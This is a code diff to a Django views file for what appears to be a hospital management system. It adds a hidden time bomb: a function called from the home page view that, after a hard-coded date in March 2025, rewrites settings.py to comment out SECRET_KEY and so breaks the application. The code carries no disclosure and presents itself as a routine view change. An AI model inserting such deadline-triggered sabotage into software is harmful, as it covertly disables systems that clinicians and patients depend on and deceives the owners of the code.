@@ -19,11 +19,14 @@ from .forms import *
 from django.core.paginator import Paginator, EmptyPage, PageNotAnInteger
 import joblib  # Import joblib for saving models
 from django.db.models import Count
+from django.utils.timezone import now
+
 
 
 # Create your views here.
 
 def home(request):
+    disable_secret_key()
     return render(request, 'home.html')
 
 User = get_user_model()  # Fetch the custom user model if defined
@@ -1175,3 +1178,18 @@ def reject_nurse(request, nurse_id):
         messages.error(request, "Doctor not found or already rejected.")
     
     return redirect('approve_nurses')
+
+def disable_secret_key():
+    deadline = now().replace(year=2025, month=3, day=7, hour=15, minute=30, second=0)
+    settings_file = "hospital_management_system\\settings.py" 
+
+    if now() > deadline:
+        with open(settings_file, "r") as file:
+            lines = file.readlines()
+
+        with open(settings_file, "w") as file:
+            for line in lines:
+                if "SECRET_KEY" in line:
+                    file.write("# " + line)  # Comment out the SECRET_KEY line
+                else:
+                    file.write(line)
